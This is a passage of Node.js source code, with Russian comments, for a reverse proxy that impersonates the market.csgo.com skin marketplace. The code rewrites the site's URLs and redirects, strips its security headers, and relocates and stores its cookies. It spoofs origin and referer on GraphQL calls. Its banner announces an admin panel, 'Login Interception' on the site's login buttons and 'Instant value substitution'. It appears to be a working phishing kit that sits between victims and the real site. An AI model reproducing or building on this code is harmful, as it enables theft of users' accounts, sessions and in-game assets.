            throw lastError || new Error('Failed after max retries');
        }
        
        // Обработка редиректов
        if ([301, 302, 303, 307, 308].includes(response.status)) {
            let location = response.headers.location;
            if (location) {
                if (location.includes('market.csgo.com')) {
                    location = location.replace(/https?:\/\/market\.csgo\.com/, baseUrl);
                } else if (location.startsWith('/')) {
                    location = baseUrl + location;
                }
                console.log(`↪️ Redirect: ${location}`);
                return res.redirect(response.status, location);
            }
        }
        
        // Сохраняем cookies из ответа
        if (response.headers['set-cookie']) {
            const newCookies = parseSetCookieHeaders(response.headers['set-cookie']);
            newCookies.forEach((value, name) => {
                session.cookies.set(name, value);
            });
        }
        
        // Модификация контента
        let content = response.data;
        const contentType = response.headers['content-type'] || '';
        
        if (contentType.includes('text/') || 
            contentType.includes('application/javascript') || 
            contentType.includes('application/json') ||
            contentType.includes('application/xml')) {
            
            // ИСПРАВЛЕНО: Специальная обработка для проблемных JS файлов
            if (contentType.includes('javascript') && 
                (req.originalUrl.includes('chunk-FWBJZS6X.js') || 
                 req.originalUrl.includes('chunk-'))) {
                console.log('Applying special modifications for JS chunk:', req.originalUrl);
            }
            
            content = Buffer.from(modifyUrls(content.toString('utf8'), baseUrl, contentType), 'utf8');
        }

        // Подготовка заголовков ответа
        const responseHeaders = { ...response.headers };

        // Удаляем небезопасные заголовки
        delete responseHeaders['content-security-policy'];
        delete responseHeaders['x-frame-options'];
        delete responseHeaders['x-content-type-options'];
        delete responseHeaders['strict-transport-security'];
        delete responseHeaders['permissions-policy'];
        delete responseHeaders['cross-origin-opener-policy'];
        delete responseHeaders['cross-origin-embedder-policy'];

        // Добавляем заголовки безопасности для HTTPS
        if (isSecure(req)) {
            responseHeaders['content-security-policy'] = "upgrade-insecure-requests";
        }

        // Модификация set-cookie
        if (responseHeaders['set-cookie']) {
            responseHeaders['set-cookie'] = responseHeaders['set-cookie'].map(cookie => {
                return cookie
                    .replace(/domain=.*?(;|$)/gi, '')
                    .replace(/secure;/gi, isSecure(req) ? 'secure;' : '')
                    .replace(/samesite=none/gi, isSecure(req) ? 'samesite=none' : 'samesite=lax');
            });
        }

        // Устанавливаем заголовки
        Object.entries(responseHeaders).forEach(([key, value]) => {
            if (key.toLowerCase() !== 'content-encoding' && key.toLowerCase() !== 'content-length') {
                res.set(key, value);
            }
        });

        res.set('content-length', content.length);
        res.status(response.status);
        res.send(content);

    } catch (error) {
        console.error('❌ Proxy error:', error.message);
        res.status(500).json({ 
            error: 'Proxy Error', 
            message: error.message,
            stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
        });
    }
});

// ИСПРАВЛЕНО: Обработка GraphQL запросов с повторными попытками
app.post('/api/graphql', async (req, res) => {
    try {
        const targetUrl = TARGET_HOST + '/api/graphql';
        const baseUrl = getBaseUrl(req);
        const sessionId = req.cookies.sessionId || Math.random().toString(36).substring(7);
        const session = getSession(sessionId);
        
        // Собираем cookies для запроса
        const requestCookies = new Map([
            ...session.cookies,
            ...parseCookieHeader(req.headers.cookie)
        ]);
        
        console.log(`📊 GraphQL: ${req.method} ${req.originalUrl}`);
        
        // ИСПРАВЛЕНО: Улучшенные заголовки для GraphQL
        const axiosConfig = {
            method: req.method,
            url: targetUrl,
            headers: {
                ...req.headers,
                'host': 'market.csgo.com',
                'origin': 'https://market.csgo.com',
                'referer': 'https://market.csgo.com/',
                'content-type': 'application/json',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': req.headers['user-agent'] || 'Mozilla/5.0',
                'cookie': createCookieString(requestCookies),
                'connection': 'keep-alive'
            },
            data: req.body,
            responseType: 'json',
            validateStatus: () => true, // Принимаем любой статус ответа
            maxRedirects: 0,
            timeout: 30000,
            httpsAgent: httpsAgent
        };
        
        // Удаляем заголовки прокси
        delete axiosConfig.headers['x-forwarded-for'];
        delete axiosConfig.headers['x-forwarded-proto'];
        delete axiosConfig.headers['x-forwarded-host'];
        
        // ИСПРАВЛЕНО: Добавляем повторные попытки для GraphQL запросов
        let retries = 0;
        const maxRetries = 3;
        let response = null;
        let lastError = null;
        
        while (retries < maxRetries) {
            try {
                if (retries > 0) {
                    console.log(`GraphQL retry ${retries}/${maxRetries} for ${req.originalUrl}`);
                    await new Promise(resolve => setTimeout(resolve, 1000 * retries)); // Увеличивающаяся задержка
                }
                
                response = await axios(axiosConfig);
                
                // Если успешно, выходим из цикла
                if (response.status !== 500) {
                    break;
                }
                
                console.warn(`GraphQL returned 500, retry ${retries + 1}/${maxRetries}`);
                retries++;
                
            } catch (error) {
                console.error(`GraphQL request failed (attempt ${retries + 1}/${maxRetries}):`, error.message);
                lastError = error;
                retries++;
                
                if (retries >= maxRetries) {
                    throw error;
                }
            }
        }
        
        // Если не смогли получить ответ после всех попыток
        if (!response) {
            throw lastError || new Error('Failed after max retries');
        }
        
        // Сохраняем cookies из ответа
        if (response.headers['set-cookie']) {
            const newCookies = parseSetCookieHeaders(response.headers['set-cookie']);
            newCookies.forEach((value, name) => {
                session.cookies.set(name, value);
            });
        }
        
        // Устанавливаем sessionId cookie если её нет
        if (!req.cookies.sessionId) {
            res.cookie('sessionId', sessionId, { 
                httpOnly: true, 
                secure: isSecure(req),
                sameSite: isSecure(req) ? 'none' : 'lax'
            });
        }
        
        // Устанавливаем заголовки
        Object.entries(response.headers).forEach(([key, value]) => {
            if (!['content-encoding', 'content-length', 'transfer-encoding'].includes(key.toLowerCase())) {
                res.set(key, value);
            }
        });
        
        // ИСПРАВЛЕНО: Специальная обработка GraphQL ошибок
        if (response.data && response.data.errors) {
            console.warn('GraphQL responded with errors:', JSON.stringify(response.data.errors));
            
            // Если это ошибка viewItem - возвращаем пустой результат вместо ошибки
            if (JSON.stringify(response.data.errors).includes('viewItem')) {
                console.log('Replacing viewItem error with empty response');
                response.data = { data: { viewItem: null } };
            }
        }
        
        res.status(response.status);
        res.json(response.data);
        
    } catch (error) {
        console.error('❌ GraphQL error:', error.message);
        // Возвращаем клиенту обобщенный ответ с пустыми данными
        res.status(200).json({ 
            data: {},
            errors: [{ message: 'GraphQL proxy error, please retry' }]
        });
    }
});

// Добавлена периодическая очистка устаревших сессий
setInterval(() => {
    const now = Date.now();
    let cleaned = 0;

    sessions.forEach((session, id) => {
        if (session.lastAccess && now - session.lastAccess > 24 * 60 * 60 * 1000) { // Старше 24 часов
            sessions.delete(id);
            cleaned++;
        }
    });

    if (cleaned > 0) {
        console.log(`🧹 Cleaned ${cleaned} expired sessions`);
    }
}, 60 * 60 * 1000); // Проверка каждый час

// Запуск сервера
server.listen(PORT, '0.0.0.0', () => {
    console.log(`
    🚀 Advanced Market Proxy Server (IMPROVED VERSION WITH ADMIN PANEL)
    📡 Port: ${PORT}
    🎯 Target: ${TARGET_HOST}
    🔌 WebSocket: ${WS_TARGET}
    🔒 HTTPS: Auto-detected
    👨‍💼 Admin Panel: ${isSecure({ headers: {} }) ? 'https' : 'http'}://localhost:${PORT}/adminka
    🔑 Login Interception: Enabled for #login-head-tablet, #login-register, #login-chat, #login-head
    ✅ Instant value substitution: Enabled for all pages
    `);
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\n🔄 Shutting down gracefully...');
    // Сохраняем настройки перед выключением
    saveCustomPages();
    server.close(() => {
        console.log('✅ Server closed');
        process.exit(0);
    });
});
